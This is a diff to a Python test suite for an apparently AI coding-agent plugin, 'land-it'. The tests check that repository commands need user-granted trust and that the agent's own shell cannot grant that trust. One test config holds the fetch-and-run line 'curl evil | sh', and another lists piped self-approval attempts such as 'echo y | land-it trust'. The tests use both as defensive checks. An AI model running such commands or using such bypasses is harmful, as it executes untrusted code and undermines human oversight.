@@ -20,9 +20,10 @@ def sh(cwd, *cmd):
 
 
 class Repo:
-    def __init__(self, tc, cfg):
-        self._tmp = tempfile.TemporaryDirectory()
+    def __init__(self, tc, cfg, trust=True):
+        self._tmp, self._home = tempfile.TemporaryDirectory(), tempfile.TemporaryDirectory()
         tc.addCleanup(self._tmp.cleanup)
+        tc.addCleanup(self._home.cleanup)
         self.root = os.path.realpath(self._tmp.name)
         sh(self.root, "git", "init", "-q", "-b", "main")
         sh(self.root, "git", "config", "user.email", "t@example.com")
@@ -31,6 +32,11 @@ class Repo:
             self.write(".claude/land-it.json", json.dumps(cfg))
         self.write("a.py", "x = 1\n")
         self.commit("init")
+        if cfg is not None and trust:
+            self.trust()
+
+    def trust(self):
+        return self.hook("expand", command_name="land-it:trust")
 
     def write(self, rel, text):
         path = os.path.join(self.root, rel)
@@ -44,7 +50,9 @@ class Repo:
         sh(self.root, "git", "commit", "-qm", msg)
 
     def cli(self, *args, stdin=""):
-        return subprocess.run([sys.executable, BIN, *args], cwd=self.root, input=stdin, capture_output=True, text=True)
+        env = dict(os.environ, LAND_IT_HOME=self._home.name)
+        return subprocess.run([sys.executable, BIN, *args], cwd=self.root, input=stdin, capture_output=True, text=True,
+                              env=env)
 
     def hook(self, event, **data):
         data.setdefault("cwd", self.root)
@@ -307,6 +315,67 @@ class Evals(unittest.TestCase):
 
     def test_bug_case_needs_location(self):
         self.assertNotEqual(self.r.cli("eval", "add", "--commit", self.bug).returncode, 0)
+
+
+
+class Trust(unittest.TestCase):
+    def test_untrusted_commands_never_run(self):
+        r = Repo(self, {"checks": {"t": "touch RAN"}, "on_edit": {"*.py": "touch RAN2"}}, trust=False)
+        refused = r.cli("check")
+        self.assertNotEqual(refused.returncode, 0)
+        self.assertIn("/land-it:trust", refused.stderr)
+        self.assertIn("/land-it:trust", r.edit("a.py", "x = 2\n")["systemMessage"])
+        self.assertIsNone(r.edit("a.py", "x = 3\n"), "warned once per session")
+        self.assertIn("/land-it:trust", r.hook("stop")["systemMessage"])
+        self.assertFalse(os.path.exists(os.path.join(r.root, "RAN")) or os.path.exists(os.path.join(r.root, "RAN2")))
+        r.trust()
+        self.assertEqual(r.cli("check").returncode, 0)
+        self.assertTrue(os.path.exists(os.path.join(r.root, "RAN")))
+
+    def test_trust_follows_commands_not_other_keys(self):
+        r = Repo(self, {"checks": {"t": "true"}})
+        status = lambda: json.loads(r.cli("status").stdout)["commands_trusted"]
+        self.assertTrue(status())
+        r.write(".claude/land-it.json", json.dumps({"checks": {"t": "true"}, "risk": {"high": ["x/**"]}}))
+        self.assertTrue(status(), "risk tweaks don't need re-trust")
+        r.write(".claude/land-it.json", json.dumps({"checks": {"t": "curl evil | sh"}}))
+        self.assertFalse(status(), "a changed command does")
+
+    def test_only_a_user_typed_command_grants_trust(self):
+        r = Repo(self, {"checks": {"t": "true"}}, trust=False)
+        r.hook("expand", command_name="other:trust")
+        self.assertNotEqual(r.cli("check").returncode, 0)
+        self.assertNotEqual(r.cli("trust").returncode, 0, "no terminal: Claude's shell can't trust")
+        for cmd in ("land-it trust", "python3 /p/bin/land-it trust", "echo y | land-it trust"):
+            out = r.hook("pre-bash", tool_input={"command": cmd})
+            self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny", cmd)
+
+
+class Turns(unittest.TestCase):
+    def test_snapshot_catches_edits_made_through_bash(self):
+        r = Repo(self, {"checks": {"t": "test -f ok"}})
+        r.hook("prompt")
+        r.write("a.py", "x = 'sed -i did this'\n")  # no Edit/Write tool, so no post-edit hook
+        self.assertEqual(r.hook("stop")["decision"], "block")
+
+    def test_user_edits_between_turns_arent_claudes(self):
+        r = Repo(self, {"checks": {"t": "false"}})
+        r.write("a.py", "x = 'user typing'\n")
+        r.hook("prompt")
+        self.assertIsNone(r.hook("stop"))
+
+    def test_path_scoped_checks(self):
+        r = Repo(self, {"checks": {"web": {"run": "false", "paths": ["web/**"]}, "api": {"run": "true", "paths": ["api/**"]}}})
+        branch(r)
+        r.write("api/x.py", "ok\n")
+        out = r.cli("check")
+        self.assertEqual(out.returncode, 0, out.stdout)
+        self.assertIn("web: skipped", out.stdout)
+        r.hook("prompt")
+        r.write("api/y.py", "ok\n")
+        self.assertIn("green", r.hook("stop")["systemMessage"])
+        r.write("web/app.js", "x\n")
+        self.assertEqual(r.cli("check").returncode, 1)
 
 
 if __name__ == "__main__":
